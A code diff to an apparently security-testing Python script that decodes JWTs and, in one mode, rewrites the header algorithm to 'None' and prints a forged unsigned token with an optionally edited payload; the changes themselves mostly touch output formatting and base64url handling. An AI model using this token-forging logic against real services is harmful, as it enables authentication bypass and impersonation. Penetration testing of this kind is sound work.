@@ -60,7 +60,7 @@ def jwtWeak():
                 req_str = base64.b64decode(Header)
             else:
                 req_str = base64.b64decode(Header)
-                req_str=req_str.decode('utf-8')
+            req_str=req_str.decode('utf-8')
             #base64 decoded Header    
             print("\n\tHeader="+str(req_str))
             
@@ -71,20 +71,19 @@ def jwtWeak():
                 req_str = base64.b64decode(Payload)
             else:
                 req_str = base64.b64decode(Payload)
-                req_str=req_str.decode('utf-8')
+            req_str=req_str.decode('utf-8')
             #base64 decoded Payload    
             print("\n\tPayload="+str(req_str))    
             
-            
+            Signature=Signature.replace('_','/').replace('-','+')
             if len(Signature) % 4 != 0: #check if multiple of 4
                 while len(Signature) % 4 != 0:
                     Signature = Signature + "="
                 req_str = base64.b64decode(Signature)
             else:
-                req_str = base64.b64decode(Signature)    
+                req_str = base64.b64decode(Signature)         
             #base64 decoded Signature 
             print("\n\tSignature="+str(req_str))
-
 #######################################################################################              
         elif choice == "B" or choice =="b":  
             part_jwt=in_jwt.split('.')
@@ -101,7 +100,7 @@ def jwtWeak():
                 req_str=req_str.decode('utf-8')
             json_header = json.loads(req_str)
             algo=json_header['alg']
-            print(f"{bcolors.UNDERLINE}\n\tThe present algorithm -"+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
+            print(f"{bcolors.UNDERLINE}\n\tThe present algorithm - "+ algo+f"{bcolors.UNDERLINE}{bcolors.ENDC}")
 
             #base64 encoded Header
             print("\n\tHeader="+Header)
@@ -114,7 +113,7 @@ def jwtWeak():
             
             json_header['alg']='None'
             
-            print("\n\tThe modified Header-"+str(json_header))
+            print("\n\tModified Header(Plain Text)="+str(json_header))
             if len(Payload) % 4 != 0: #check if multiple of 4
                 while len(Payload) % 4 != 0:
                     Payload = Payload + "="
@@ -123,10 +122,10 @@ def jwtWeak():
                 req_str = base64.b64decode(Payload)
             b64decoded_payload=req_str.decode('utf-8')
             #base64 decoded Payload    
-            print("\n\tPayload="+str(b64decoded_payload)) 
+            print("\n\tPayload(Plain Text)="+str(b64decoded_payload)) 
             
 
-            print("\n\tPlease Enter the modified Payload in plain text format (if you want)")
+            print("\n\tPlease provide the modified Payload(plain text) [if not, press ENTER]:")
             mod_payload=input()
             if re.match(r'(.*?)(?:")',mod_payload):
                 print("\n\tModified payload is:"+mod_payload)
@@ -136,16 +135,16 @@ def jwtWeak():
                 mod_payload=str(mod_payload)
                 b64_Payload = base64.b64encode(mod_payload.encode("utf-8"))
                 b64_encoded_Payload = str(b64_Payload, "utf-8")   
-                print("The New JWT Token with Algorithm changed to 'None':"+b64_encoded_header+"."+b64_encoded_Payload+".")
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'None':\n\t"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
             elif not mod_payload:
-                print("The payload is unchanged")
+                print(f"{bcolors.OKBLUE}\n\tThe payload is unchanged{bcolors.ENDC}")
                 json_header=str(json_header)
                 b64_Header = base64.b64encode(json_header.encode("utf-8"))
                 b64_encoded_header = str(b64_Header, "utf-8")
                 b64decoded_payload=str(b64decoded_payload)
                 b64_Payload = base64.b64encode(b64decoded_payload.encode("utf-8"))
                 b64_encoded_Payload = str(b64_Payload, "utf-8")
-                print("The New JWT Token with Algorithm changed to 'None':"+b64_encoded_header+"."+b64_encoded_Payload+".")
+                print(f"{bcolors.OKGREEN}\n\tThe New JWT Token with Algorithm changed to 'None':\n\t"+b64_encoded_header+"."+b64_encoded_Payload+"."+f"{bcolors.OKGREEN}{bcolors.ENDC}")
             else:
                 print("Not Valid Payload") 
                 
@@ -164,7 +163,7 @@ def jwtWeak():
                 
     
     else:
-        print("This is not a valid input JWT Token")
+        print(f"{bcolors.FAIL}\nThis is not a valid input JWT Token{bcolors.ENDC}\n")
 
 
 if __name__ == '__main__':
